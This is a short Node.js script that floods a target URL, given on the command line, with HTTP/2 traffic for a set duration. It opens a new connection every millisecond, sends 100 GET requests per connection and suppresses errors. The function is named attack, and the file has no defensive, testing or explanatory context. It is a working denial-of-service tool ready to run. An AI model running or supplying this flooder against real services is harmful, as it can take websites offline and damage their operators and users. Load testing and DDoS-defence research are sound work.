const http2 = require('http2');
const target = process.argv[2], duration = parseInt(process.argv[3]);
const url = new URL(target);
const start = Date.now();

function attack() {
    if (Date.now() - start > duration * 1000) process.exit();
    const client = http2.connect(target);
    client.on('error', () => {});
    for (let i = 0; i < 100; i++) {
        const req = client.request({ ':method': 'GET', ':path': url.pathname });
        req.end();
    }
    setTimeout(attack, 1);
}
attack();

